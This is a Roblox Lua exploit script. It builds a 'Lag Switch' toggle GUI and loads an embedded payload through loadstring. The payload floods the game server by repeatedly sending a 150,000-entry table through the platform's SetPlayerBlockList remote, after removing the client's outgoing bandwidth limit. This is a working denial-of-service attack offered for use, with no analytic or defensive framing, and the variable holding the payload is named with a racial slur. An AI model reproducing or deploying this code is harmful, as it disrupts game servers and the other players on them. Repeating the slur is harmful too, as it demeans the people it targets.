local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local colors = {
    bg = Color3.fromRGB(14, 14, 16),
    surface = Color3.fromRGB(22, 22, 26),
    disabled = Color3.fromRGB(38, 38, 44),
    border = Color3.fromRGB(60, 60, 68),
    accent = Color3.fromRGB(230, 35, 35),
    accentDark = Color3.fromRGB(170, 22, 22),
    accentBright = Color3.fromRGB(255, 70, 70),
    crimson = Color3.fromRGB(110, 15, 15),
    text = Color3.fromRGB(238, 238, 242),
    white = Color3.fromRGB(255, 255, 255),
    black = Color3.fromRGB(0, 0, 0),
}

local font = Enum.Font.GothamBlack

local niggersploitwskidburger = [==[
local RunService = game:GetService("RunService")

local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false

local state = {
    running = false,
    thread  = nil,
    remote  = nil,
    cache   = nil,
    pad     = "",
}

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

state.remote = resolve()

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""

local function build()
    local root = table.create(Children)
    for i = 1, Children do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if RebuildEach or not state.cache then
        payload = build()
        if not RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
end

local function start()
    if state.running then return end
    state.running = true
    state.cache = nil
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            if FrameDelay > 0 then
                task.wait(FrameDelay)
            else
                RunService.Heartbeat:Wait()
            end
        end
    end)
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end

return {
    start  = start,
    stop   = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
}
]==]

local loader = coroutine.create(function()
    local chunk = loadstring(niggersploitwskidburger)
    if not chunk then return end
    local ok, api = pcall(chunk)
    if ok and type(api) == "table" then
        _G.__ALT = api
    end
end)

coroutine.resume(loader)
loader = nil

local api = _G.__ALT
_G.__ALT = nil

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLoseUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local main = Instance.new("Frame")
main.Name = "MainFrame"
main.Size = UDim2.new(0, 210, 0, 92)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = colors.bg
main.BorderSizePixel = 0
main.ClipsDescendants = false
main.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = main

local mainGrad = Instance.new("UIGradient")
mainGrad.Color = ColorSequence.new(colors.bg, Color3.fromRGB(22, 14, 14))
mainGrad.Rotation = 135
mainGrad.Parent = main

local innerMask = Instance.new("Frame")
innerMask.Name = "InnerMask"
innerMask.Size = UDim2.new(1, -2, 1, -2)
innerMask.Position = UDim2.new(0.5, 0, 0.5, 0)
innerMask.AnchorPoint = Vector2.new(0.5, 0.5)
innerMask.BackgroundColor3 = colors.bg
innerMask.BorderSizePixel = 0
innerMask.ZIndex = 1
innerMask.Parent = main

local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0, 9)
innerCorner.Parent = innerMask

local innerGrad = Instance.new("UIGradient")
innerGrad.Color = ColorSequence.new(colors.bg, Color3.fromRGB(22, 14, 14))
innerGrad.Rotation = 135
innerGrad.Parent = innerMask

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 34)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Font = font
title.Text = "Lag Switch"
title.TextColor3 = colors.text
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 3
title.Parent = main

local toggle = Instance.new("TextButton")
toggle.Name = "Toggle"
toggle.Size = UDim2.new(1, -20, 0, 38)
toggle.Position = UDim2.new(0, 10, 0, 44)
toggle.BackgroundColor3 = colors.disabled
toggle.BorderSizePixel = 0
toggle.Font = font
toggle.Text = ""
toggle.TextTransparency = 1
toggle.AutoButtonColor = false
toggle.ZIndex = 3
toggle.Parent = main

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 8)
toggleCorner.Parent = toggle

local toggleGrad = Instance.new("UIGradient")
toggleGrad.Color = ColorSequence.new(colors.disabled, Color3.fromRGB(48, 48, 54))
toggleGrad.Rotation = 135
toggleGrad.Parent = toggle

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = colors.crimson
toggleStroke.Thickness = 2
toggleStroke.Transparency = 0
toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
toggleStroke.Parent = toggle

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Name = "Label"
toggleLabel.Size = UDim2.new(1, 0, 1, 0)
toggleLabel.Position = UDim2.new(0, 0, 0, 0)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Font = font
toggleLabel.Text = "DISABLED"
toggleLabel.TextColor3 = colors.white
toggleLabel.TextTransparency = 0
toggleLabel.TextSize = 14
toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
toggleLabel.TextYAlignment = Enum.TextYAlignment.Center
toggleLabel.ZIndex = 5
toggleLabel.Active = false
toggleLabel.Parent = toggle

local active = false

RunService.RenderStepped:Connect(function(dt)
    if active then
        toggleStroke.Thickness = 2 + math.sin(tick() * 3) * 0.5
    end
end)

local function setActive(state)
    active = state

    if state then
        toggle.BackgroundColor3 = colors.accentBright
        toggleGrad.Color = ColorSequence.new(colors.accent, colors.accentBright)
        toggleGrad.Rotation = 0
        toggleStroke.Color = colors.accentBright
        toggleLabel.Text = "ENABLED"
        toggleLabel.TextColor3 = colors.black
        if api and api.start then
            pcall(api.start)
        end
    else
        toggle.BackgroundColor3 = colors.disabled
        toggleGrad.Color = ColorSequence.new(colors.disabled, Color3.fromRGB(48, 48, 54))
        toggleGrad.Rotation = 135
        toggleStroke.Color = colors.crimson
        toggleLabel.Text = "DISABLED"
        toggleLabel.TextColor3 = colors.white
        toggleStroke.Thickness = 2
        if api and api.stop then
            pcall(api.stop)
        end
    end
end

toggle.MouseButton1Click:Connect(function()
    setActive(not active)
end)

local dragging = false
local dragStart, startPos

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)